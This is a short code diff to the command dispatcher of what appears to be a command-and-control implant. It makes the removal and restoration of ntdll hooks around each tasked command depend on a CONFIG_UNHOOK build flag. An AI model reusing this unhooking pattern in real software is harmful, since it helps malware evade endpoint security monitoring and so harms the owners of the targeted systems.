@@ -78,13 +78,16 @@ VOID CommandDispatcher() {
                         if ( Commands[FunctionCounter].ID == TaskCommand) {
 
                             // unhook
+#if CONFIG_UNHOOK
                             HookingManager(TRUE, pCacheClean, p_ntdll, ntdll_size);
-
+#endif
                             // execute command
                             Commands[FunctionCounter].Function(&Parser);
 
                             // rehook
+#if CONFIG_UNHOOK
                             HookingManager(FALSE, pCacheRestore, p_ntdll, ntdll_size);
+#endif
                             FoundCommand = TRUE;
                             break;
                         }
